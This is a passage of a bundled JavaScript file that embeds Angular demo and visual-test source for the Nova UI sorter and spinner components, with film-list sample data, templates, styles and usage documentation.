= this.dataColumns;\n\n    @ViewChild(SorterComponent)\n    private sorter: SorterComponent;\n\n    private readonly showSubject = new BehaviorSubject(true);\n    public readonly show$ = this.showSubject.asObservable();\n    public sortDirection = SorterDirection.ascending;\n    public sortBy = this.columns[0].value;\n    public items: IFilm[] = getData();\n\n    public ngOnInit(): void {\n        this.sortItems(this.sortBy, this.sortDirection);\n    }\n\n    public updateSorterDirection(): void {\n        const old = this.sortDirection;\n        this.sortDirection =\n            old === SorterDirection.ascending\n                ? SorterDirection.descending\n                : SorterDirection.ascending;\n    }\n\n    public onSorterAction(changeEvent: ISorterChanges): void {\n        this.sortBy = changeEvent.newValue.sortBy;\n        this.sortItems(\n            changeEvent.newValue.sortBy,\n            changeEvent.newValue.direction\n        );\n    }\n\n    private async delayPromise(delay: number = 0): Promise<void> {\n        return new Promise((resolve) => {\n            setTimeout(resolve, delay);\n        });\n    }\n\n    public async resetSorter(): Promise<void> {\n        this.showSubject.next(false);\n        await this.delayPromise();\n        this.columns = this.emptyColumns;\n        this.sortBy = "";\n        this.showSubject.next(true);\n    }\n\n    public updateSorterByProperty(): void {\n        this.columns = this.dataColumns;\n        this.sortBy = this.dataColumns[1].value;\n    }\n\n    public updateSorterByMethod(): void {\n        this.columns = this.dataColumns;\n        this.sorter.select(this.dataColumns[2]);\n    }\n\n    private sortItems(sortBy: string, direction: SorterDirection) {\n        this.items = _orderBy(\n            this.items,\n            [sortBy],\n            [\n                direction as\n                    | SorterDirection.ascending\n                    | SorterDirection.descending,\n            ]\n        ) as IFilm[];\n    }\n}\n\nfunction getData(): IFilm[] {\n    return [\n        { title: "Vertigo", year: "1958", director: "Alfred Hitchcock" },\n        { title: "Citizen Kane", year: "1941", director: "Orson Welles" },\n        {\n            title: "2001: A Space Odyssey",\n            year: "1968",\n            director: "Stanley Kubrick",\n        },\n        {\n            title: "The Godfather",\n            year: "1972",\n            director: "Francis Ford Coppola",\n        },\n        { title: "Mulholland Dr.", year: "2001", director: "David Lynch" },\n        { title: "Taxi Driver", year: "1976", director: "Martin Scorsese" },\n        { title: "La Dolce Vita", year: "1960", director: "Federico Fellini" },\n        {\n            title: "The Silence of the Lambs",\n            year: "1991",\n            director: "Jonathan Demme",\n        },\n        { title: "The Terminator", year: "1984", director: "James Cameron" },\n    ];\n}\n'},76398:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-sorter\n    id="nui-demo-sorter-legacy-string-input"\n    caption="Sorter Caption"\n    [itemsSource]="columns"\n    [selectedItem]="sortBy"\n    [sortDirection]="initialSortDirection"\n    (sorterAction)="onSorterAction($event)"\n>\n</nui-sorter>\n<nui-repeat [itemsSource]="items" [repeatItemTemplateRef]="repeatItemTemplate">\n    <div repeatHeaderTemplate>\n        <div class="sorter-flex-header">\n            <div class="sorter-flex-row">\n                <div\n                    class="sorter-flex-item header-item"\n                    *ngFor="let col of columns"\n                >\n                    {{ col | titlecase }}\n                </div>\n            </div>\n        </div>\n    </div>\n</nui-repeat>\n<ng-template #repeatItemTemplate let-item="item">\n    <div class="sorter-flex-row">\n        <div class="sorter-flex-item">{{ item.title }}</div>\n        <div class="sorter-flex-item">{{ item.year }}</div>\n        <div class="sorter-flex-item">{{ item.director }}</div>\n    </div>\n</ng-template>\n'},4094:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t="@col-width: 180px;\n\n.sorter-flex-row {\n    display: flex;\n    flex-grow: 0;\n    flex-direction: row;\n    flex-wrap: wrap;\n    width: 100%;\n    padding: 0px 10px;\n}\n.sorter-flex-header {\n    padding-left: 3px;\n    margin-left: 5px;\n    margin-right: 10px;\n}\n.header-item {\n    font-weight: bold;\n    margin-top: 10px;\n}\n.sorter-flex-item {\n    padding: 5px;\n    flex-grow: 1;\n    overflow: hidden;\n    white-space: nowrap;\n    text-overflow: ellipsis;\n    padding-right: 10px;\n    width: @col-width;\n}\n"},9738:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { AfterViewInit, Component } from "@angular/core";\nimport _orderBy from "lodash/orderBy";\n\nimport { ISorterChanges, SorterDirection } from "@nova-ui/bits";\n\ninterface IFilm {\n    title: string;\n    year: string;\n    director: string;\n}\n\n@Component({\n    selector: "nui-sorter-legacy-string-input-usage-visual-test",\n    templateUrl:\n        "./sorter-legacy-string-input-usage-visual-test.component.html",\n    styleUrls: [\n        "./sorter-legacy-string-input-usage-visual-test.component.less",\n    ],\n})\nexport class SorterLegacyStringInputUsageVisualTestComponent\n    implements AfterViewInit\n{\n    public readonly columns = ["title", "year", "director"];\n    public readonly initialSortDirection = SorterDirection.ascending;\n    public sortBy = this.columns[1];\n\n    public items: IFilm[] = [\n        { title: "Vertigo", year: "1958", director: "Alfred Hitchcock" },\n        { title: "Citizen Kane", year: "1941", director: "Orson Welles" },\n        {\n            title: "2001: A Space Odyssey",\n            year: "1968",\n            director: "Stanley Kubrick",\n        },\n        {\n            title: "The Godfather",\n            year: "1972",\n            director: "Francis Ford Coppola",\n        },\n        { title: "Mulholland Dr.", year: "2001", director: "David Lynch" },\n        { title: "Taxi Driver", year: "1976", director: "Martin Scorsese" },\n        { title: "La Dolce Vita", year: "1960", director: "Federico Fellini" },\n        {\n            title: "The Silence of the Lambs",\n            year: "1991",\n            director: "Jonathan Demme",\n        },\n        { title: "The Terminator", year: "1984", director: "James Cameron" },\n    ];\n\n    public ngAfterViewInit(): void {\n        this.sortItems(this.sortBy, this.initialSortDirection);\n    }\n\n    onSorterAction(changeEvent: ISorterChanges): void {\n        this.sortBy = changeEvent.newValue.sortBy;\n        this.sortItems(\n            changeEvent.newValue.sortBy,\n            changeEvent.newValue.direction\n        );\n    }\n\n    private sortItems(sortBy: string, direction: SorterDirection) {\n        this.items = _orderBy(\n            this.items,\n            [sortBy],\n            [\n                direction as\n                    | SorterDirection.ascending\n                    | SorterDirection.descending,\n            ]\n        ) as IFilm[];\n    }\n}\n'},70444:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-sorter\n    id="nui-demo-sorter"\n    caption="Sorter Caption"\n    [itemsSource]="columns"\n    [selectedItem]="sortBy"\n    [sortDirection]="initialSortDirection"\n    (sorterAction)="onSorterAction($event)"\n>\n</nui-sorter>\n<nui-repeat [itemsSource]="items" [repeatItemTemplateRef]="repeatItemTemplate">\n    <div repeatHeaderTemplate>\n        <div class="sorter-flex-header">\n            <div class="sorter-flex-row">\n                <div\n                    class="sorter-flex-item header-item"\n                    *ngFor="let col of columns"\n                >\n                    {{ col.title }}\n                </div>\n            </div>\n        </div>\n    </div>\n</nui-repeat>\n<ng-template #repeatItemTemplate let-item="item">\n    <div class="sorter-flex-row">\n        <div class="sorter-flex-item">{{ item.title }}</div>\n        <div class="sorter-flex-item">{{ item.year }}</div>\n        <div class="sorter-flex-item">{{ item.director }}</div>\n    </div>\n</ng-template>\n'},73260:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t="@col-width: 180px;\n\n.sorter-flex-row {\n    display: flex;\n    flex-grow: 0;\n    flex-direction: row;\n    flex-wrap: wrap;\n    width: 100%;\n    padding: 0px 10px;\n}\n.sorter-flex-header {\n    padding-left: 3px;\n    margin-left: 5px;\n    margin-right: 10px;\n}\n.header-item {\n    font-weight: bold;\n    margin-top: 10px;\n}\n.sorter-flex-item {\n    padding: 5px;\n    flex-grow: 1;\n    overflow: hidden;\n    white-space: nowrap;\n    text-overflow: ellipsis;\n    padding-right: 10px;\n    width: @col-width;\n}\n"},15644:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, OnInit } from "@angular/core";\nimport _orderBy from "lodash/orderBy";\n\nimport { IMenuItem, ISorterChanges, SorterDirection } from "@nova-ui/bits";\n\ninterface IFilm {\n    title: string;\n    year: string;\n    director: string;\n}\n\n@Component({\n    selector: "nui-sorter-recommended-usage-visual-test",\n    templateUrl: "./sorter-recommended-usage-visual-test.component.html",\n    styleUrls: ["./sorter-recommended-usage-visual-test.component.less"],\n})\nexport class SorterRecommendedUsageVisualTestComponent implements OnInit {\n    public readonly columns: IMenuItem[] = [\n        {\n            title: $localize`LongColumnNameForTitleLongColumnNameForTitle`,\n            value: "title",\n        },\n        {\n            title: $localize`Year`,\n            value: "year",\n        },\n        {\n            title: $localize`Director`,\n            value: "director",\n        },\n    ];\n\n    public readonly initialSortDirection = SorterDirection.ascending;\n    public sortBy = this.columns[1].value;\n\n    public items: IFilm[] = [\n        { title: "Vertigo", year: "1958", director: "Alfred Hitchcock" },\n        { title: "Citizen Kane", year: "1941", director: "Orson Welles" },\n        {\n            title: "2001: A Space Odyssey",\n            year: "1968",\n            director: "Stanley Kubrick",\n        },\n        {\n            title: "The Godfather",\n            year: "1972",\n            director: "Francis Ford Coppola",\n        },\n        { title: "Mulholland Dr.", year: "2001", director: "David Lynch" },\n        { title: "Taxi Driver", year: "1976", director: "Martin Scorsese" },\n        { title: "La Dolce Vita", year: "1960", director: "Federico Fellini" },\n        {\n            title: "The Silence of the Lambs",\n            year: "1991",\n            director: "Jonathan Demme",\n        },\n        { title: "The Terminator", year: "1984", director: "James Cameron" },\n    ];\n\n    public ngOnInit(): void {\n        this.sortItems(this.sortBy, this.initialSortDirection);\n    }\n\n    onSorterAction(changeEvent: ISorterChanges): void {\n        this.sortBy = changeEvent.newValue.sortBy;\n        this.sortItems(\n            changeEvent.newValue.sortBy,\n            changeEvent.newValue.direction\n        );\n    }\n\n    private sortItems(sortBy: string, direction: SorterDirection) {\n        this.items = _orderBy(\n            this.items,\n            [sortBy],\n            [\n                direction as\n                    | SorterDirection.ascending\n                    | SorterDirection.descending,\n            ]\n        ) as IFilm[];\n    }\n}\n'},6199:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container">\n    <h2>Sorter</h2>\n    <nui-sorter-recommended-usage-visual-test></nui-sorter-recommended-usage-visual-test>\n    <br />\n    <h2>Sorter With Legacy String Input</h2>\n    <nui-sorter-legacy-string-input-usage-visual-test></nui-sorter-legacy-string-input-usage-visual-test>\n</div>\n'},11087:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    templateUrl: "./sorter-visual-test-harness.component.html",\n})\nexport class SorterVisualTestHarnessComponent {}\n'},13991:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiDocsModule,\n    NuiMessageModule,\n    NuiRepeatModule,\n    NuiSorterModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport { SorterBasicExampleComponent } from "./sorter-basic/sorter-basic.example.component";\nimport { SorterExampleComponent } from "./sorter-docs/sorter-docs.example.component";\nimport { SorterTestExampleComponent } from "./sorter-test/sorter-test.example.component";\nimport { SorterLegacyStringInputUsageVisualTestComponent } from "./sorter-visual-test/sorter-legacy-string-input-usage/sorter-legacy-string-input-usage-visual-test.component";\nimport { SorterRecommendedUsageVisualTestComponent } from "./sorter-visual-test/sorter-recommended-usage/sorter-recommended-usage-visual-test.component";\nimport { SorterVisualTestHarnessComponent } from "./sorter-visual-test/sorter-visual-test-harness.component";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: SorterExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "sorter-test",\n        component: SorterTestExampleComponent,\n    },\n    {\n        path: "visual-test",\n        component: SorterVisualTestHarnessComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiSorterModule,\n        NuiRepeatModule,\n        NuiMessageModule,\n        NuiDocsModule,\n        RouterModule.forChild(routes),\n    ],\n    declarations: [\n        SorterBasicExampleComponent,\n        SorterLegacyStringInputUsageVisualTestComponent,\n        SorterExampleComponent,\n        SorterRecommendedUsageVisualTestComponent,\n        SorterVisualTestHarnessComponent,\n        SorterTestExampleComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("sorter"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class SorterModule {}\n'},34660:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport { SpinnerExampleComponent } from "./spinner-docs/spinner-docs.example.component";\nexport { SpinnerBasicExampleComponent } from "./spinner-basic/spinner-basic.example.component";\nexport { SpinnerDeterminateExampleComponent } from "./spinner-determinate/spinner-determinate.example.component";\nexport { SpinnerWithCancelExampleComponent } from "./spinner-with-cancel/spinner-with-cancel.example.component";\nexport { SpinnerWithDelayToggleExampleComponent } from "./spinner-with-delay-toggle/spinner-with-delay-toggle.example.component";\nexport { SpinnerSizesExampleComponent } from "./spinner-sizes/spinner-sizes.example.component";\nexport { SpinnerWithTextExampleComponent } from "./spinner-with-text/spinner-with-text.example.component";\nexport { SpinnerTestComponent } from "./spinner-test/spinner-test";\nexport { SpinnerVisualTestComponent } from "./spinner-visual-test/spinner-visual-test.component";\n'},41830:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-spinner [show]="true"></nui-spinner>\n'},13349:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-spinner-basic-example",\n    templateUrl: "./spinner-basic.example.component.html",\n})\nexport class SpinnerBasicExampleComponent {}\n'},90874:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<button\n    nui-button\n    type="button"\n    (click)="toggleSpinners()"\n    displayStyle="primary"\n    i18n\n>\n    Start/stop progress\n</button>\n<nui-spinner [show]="show" [percent]="spinPercentage"> </nui-spinner>\n\n<nui-spinner size="large" [show]="show" [percent]="spinPercentage">\n</nui-spinner>\n'},75942:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, OnDestroy } from "@angular/core";\n\n@Component({\n    selector: "nui-spinner-determinate-example",\n    templateUrl: "./spinner-determinate.example.component.html",\n})\nexport class SpinnerDeterminateExampleComponent implements OnDestroy {\n    public show = false;\n    public spinPercentage = 0;\n\n    private interval: any = undefined;\n\n    public toggleSpinners(): void {\n        this.show = !this.show;\n        this.show ? this.startProgress() : this.onCancel();\n    }\n\n    public startProgress(): void {\n        this.clearInterval();\n        this.interval = setInterval(() => {\n            this.spinPercentage < 100\n                ? (this.spinPercentage += 10)\n                : this.onCancel();\n        }, 500);\n    }\n\n    public onCancel(): void {\n        this.clearInterval();\n        this.show = false;\n        this.spinPercentage = 0;\n    }\n\n    public ngOnDestroy(): void {\n        this.clearInterval();\n    }\n\n    private clearInterval() {\n        if (this.interval) {\n            clearInterval(this.interval);\n            this.interval = undefined;\n        }\n    }\n}\n'},71598:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h2>Required Modules</h2>\n<ul>\n    <li>\n        <code>NuiSpinnerModule</code>\n    </li>\n</ul>\n\n<h2>Basic Usage</h2>\n\n<p>\n    In order to use spinner component, you need to pass\n    <code>show</code> binding.\n</p>\n\n<nui-example-wrapper filenamePrefix="spinner-basic" exampleTitle="Basic Usage">\n    <nui-spinner-basic-example></nui-spinner-basic-example>\n</nui-example-wrapper>\n\n<h2>Size Setting</h2>\n\n<p>\n    Spinner supports two sizes: large and small. The default is small. For a\n    larger spinner, you can pass <code>large</code> to the\n    <code>size</code> input.\n</p>\n\n<nui-example-wrapper filenamePrefix="spinner-sizes" exampleTitle="Sizes">\n    <nui-spinner-sizes-example></nui-spinner-sizes-example>\n</nui-example-wrapper>\n\n<h2>Adding Text</h2>\n\n<p>\n    Spinner label could be placed on the right side. You only need to pass\n    <code>message</code> string for that. In order to display additional help\n    text on the right side you need to pass <code>helpText</code> string.\n    <strong>Note:</strong> In order to display the help text, the\n    <code>size</code> input must be set to <code>large</code>.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="spinner-with-text"\n    exampleTitle="Indeterminate With Text"\n>\n    <nui-spinner-with-text-example></nui-spinner-with-text-example>\n</nui-example-wrapper>\n\n<h2>Determinate Progress</h2>\n\n<p>\n    To enable determinate progress, set the <code>percent</code> input and pass\n    updates to it with numbers between 0 and 100.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="spinner-determinate"\n    exampleTitle="Determinate Progress"\n>\n    <nui-spinner-determinate-example></nui-spinner-determinate-example>\n</nui-example-wrapper>\n\n<h2>Enabling Cancellation</h2>\n\n<p>\n    The spinner can be set to allow cancellation by passing true to the\n    <code>allowCancel</code> input. To take action on a cancellation, pass a\n    handler to the <code>cancel</code> output.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="spinner-with-cancel"\n    exampleTitle="Determinate Progress With Cancel"\n>\n    <nui-spinner-with-cancel-example></nui-spinner-with-cancel-example>\n</nui-example-wrapper>\n\n<h2>Modifying Delayed Appearance</h2>\n\n<p>\n    To mitigate the possibility of a blink effect that may happen due to the\n    show/hide timing, you can optionally set the <code>delay</code> input in\n    milliseconds. As the name implies, this input can be used to override the\n    delay before showing the spinner for the specified duration after the\n    <code>show</code> input value changes to true. The default value for the\n    <code>delay</code> input is 250.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="spinner-with-delay-toggle"\n    exampleTitle="Delayed Appearance"\n>\n    <nui-spinner-with-delay-toggle-example></nui-spinner-with-delay-toggle-example>\n</nui-example-wrapper>\n'},70058:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-spinner-docs-example",\n    templateUrl: "./spinner-docs.example.component.html",\n})\nexport class SpinnerExampleComponent {}\n'},24318:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-spinner size="large" [show]="true"></nui-spinner>\n'},55642:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-spinner-sizes-example",\n    templateUrl: "./spinner-sizes.example.component.html",\n})\nexport class SpinnerSizesExampleComponent {}\n'},39649:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div [@.disabled]="true">\n    <div class="p-3">\n        <button\n            nui-button\n            type="button"\n            class="mr-3"\n            id="spinnerButton1"\n            (click)="show1 = !show1"\n            displayStyle="primary"\n            i18n\n        >\n            toggle delayed spinner\n        </button>\n        <nui-spinner\n            id="spinner1"\n            [show]="show1"\n            [percent]="spinPercentage"\n            [delay]="500"\n        >\n        </nui-spinner>\n    </div>\n\n    <div class="p-3">\n        <button\n            nui-button\n            type="button"\n            class="mr-3"\n            id="spinnerButton2"\n            (click)="show2 = !show2"\n            displayStyle="primary"\n            i18n\n        >\n            toggle default spinner\n        </button>\n        <nui-spinner id="spinner2" [show]="show2"> </nui-spinner>\n    </div>\n</div>\n'},75693:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included 